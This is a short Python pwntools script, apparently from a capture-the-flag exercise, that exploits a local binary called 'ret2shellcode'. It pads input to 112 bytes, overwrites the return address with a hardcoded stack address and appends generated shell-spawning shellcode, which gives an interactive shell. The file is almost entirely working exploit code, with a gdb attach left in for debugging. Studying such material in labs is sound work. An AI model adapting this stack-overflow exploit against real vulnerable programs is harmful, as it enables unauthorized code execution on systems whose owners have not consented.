#!/usr/bin/env python
from pwn import *

context.log_level="debug"

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0xffdc3140

#sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
pwnlib.gdb.attach(proc.pidof(sh)[0])
pause()
sh.sendline('a'*112+ p32(buf2_addr)+shellcode)
sh.interactive()
